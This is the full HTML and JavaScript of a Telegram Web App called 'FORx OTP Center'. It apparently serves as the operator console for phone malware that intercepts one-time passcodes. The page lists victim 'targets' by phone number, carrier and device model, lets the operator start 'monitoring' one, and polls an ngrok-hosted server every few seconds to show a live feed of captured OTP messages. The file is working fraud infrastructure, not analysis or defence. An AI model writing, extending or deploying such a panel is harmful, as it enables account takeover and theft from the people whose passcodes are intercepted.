<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>FORx OTP Center</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { background:#0a0a0a; color:#e0e0e0; font-family:sans-serif; margin:0; padding:15px; }
        .card { background:#1e1e1e; border-radius:12px; padding:15px; margin-bottom:10px; display:flex; justify-content:space-between; align-items:center; }
        .btn { background:#2ecc71; border:none; color:#000; padding:8px 16px; border-radius:6px; font-weight:bold; cursor:pointer; }
        .btn.stop { background:#e74c3c; }
        #feed { height:300px; overflow-y:auto; background:#111; border-radius:8px; padding:10px; }
        .otp { background:#2c3e50; margin:5px 0; padding:8px; border-radius:5px; font-size:14px; }
        input[type=text] { width:100%; padding:8px; margin-bottom:10px; border-radius:5px; border:none; }
    </style>
</head>
<body>
    <h2>🔥 FORx OTP Center</h2>
    <input type="text" id="search" placeholder="Filter by phone..." oninput="filterTargets()">
    <div id="targets"></div>
    <hr>
    <h3>⚡ Live Feed</h3>
    <div id="feed"></div>

    <script>
        const tg = Telegram.WebApp;
        // ⚠️ IMPORTANT: Change to your actual ngrok URL when testing locally
        const API = 'https://limit-crispness-uncork.ngrok-free.dev';   // <--- UPDATE THIS
        const userId = tg.initDataUnsafe.user.id;
        let allTargets = [];
        let monitorActive = false;
        let pollTimer = null;
        let lastOtpTs = 0;

        async function loadTargets() {
            try {
                let res = await fetch(`${API}/api/targets`, { headers: { 'Authorization': userId } });
                allTargets = await res.json();
                renderTargets(allTargets);
            } catch(e) { console.error(e); }
        }

        function renderTargets(targets) {
            let html = '';
            targets.forEach(t => {
                html += `<div class="card" data-phone="${t.phone1}">
                    <div><b>${t.phone1}</b> (${t.carrier1})<br><small>${t.model} | DB-${t.db_index}</small></div>
                    <button class="btn" onclick="monitorDevice('${t.did}', ${t.db_index}, '${t.phone1}', '${t.model}')">▶️ Monitor</button>
                </div>`;
            });
            document.getElementById('targets').innerHTML = html || '<p>No targets online.</p>';
        }

        function filterTargets() {
            let query = document.getElementById('search').value.toLowerCase();
            let filtered = allTargets.filter(t => t.phone1.includes(query) || (t.phone2 && t.phone2.includes(query)));
            renderTargets(filtered);
        }

        async function monitorDevice(did, dbIndex, phone, model) {
            // If already monitoring, stop first
            if (monitorActive) {
                await fetch(`${API}/api/monitor`, { method: 'DELETE', headers: { 'Content-Type':'application/json' }, body: JSON.stringify({ user_id: userId }) });
            }
            await fetch(`${API}/api/monitor`, {
                method: 'POST',
                headers: { 'Content-Type':'application/json' },
                body: JSON.stringify({ user_id: userId, did, db_index: dbIndex, phone1: phone, model })
            });
            monitorActive = true;
            tg.showAlert(`Monitoring ${phone}`);
            // Start OTP polling if not already
            if (!pollTimer) {
                pollOTP();
                pollTimer = setInterval(pollOTP, 3000);
            }
        }

        async function pollOTP() {
            try {
                let res = await fetch(`${API}/api/otp/${userId}?since=${lastOtpTs}`);
                let msgs = await res.json();
                if (msgs.length) {
                    let feed = document.getElementById('feed');
                    msgs.forEach(m => {
                        feed.innerHTML += `<div class="otp">${m.text}</div>`;
                        lastOtpTs = m.ts || lastOtpTs;
                    });
                    feed.scrollTop = feed.scrollHeight;
                }
            } catch(e) {}
        }

        // Initial load
        loadTargets();
        setInterval(loadTargets, 30000);
    </script>
</body>
</html>
